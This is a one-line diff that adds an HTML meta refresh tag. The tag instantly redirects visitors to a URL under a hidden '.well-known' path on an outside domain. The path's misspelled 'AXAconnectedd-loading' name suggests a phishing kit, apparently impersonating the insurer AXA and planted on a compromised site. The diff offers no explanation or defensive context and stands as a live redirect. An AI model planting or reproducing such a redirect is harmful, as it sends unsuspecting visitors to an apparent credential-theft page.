@@ -1,0 +1,1 @@
+<META http-equiv="refresh" content="0;URL=https://vaytienodau.net/.well-known/AXAconnectedd-loading/responsivese/">
